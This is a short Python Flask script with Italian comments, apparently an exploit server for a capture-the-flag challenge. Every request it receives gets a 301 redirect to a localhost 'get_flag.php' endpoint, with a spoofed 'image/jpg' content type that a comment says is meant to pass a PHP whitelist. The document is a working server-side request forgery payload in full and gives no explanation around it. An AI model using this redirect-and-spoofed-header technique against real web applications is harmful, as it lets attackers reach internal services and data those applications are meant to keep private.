from flask import Flask, Response

app = Flask(__name__)

REDIRECT_TARGET = "http://localhost/get_flag.php"

@app.route("/")
@app.route("/<path:path>")
def redirect_all(path=None):

    response = Response("", status=301)

    # header che deve passare la whitelist PHP
    response.headers["Content-Type"] = "image/jpg"

    # redirect verso localhost
    response.headers["Location"] = REDIRECT_TARGET

    return response


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=9011)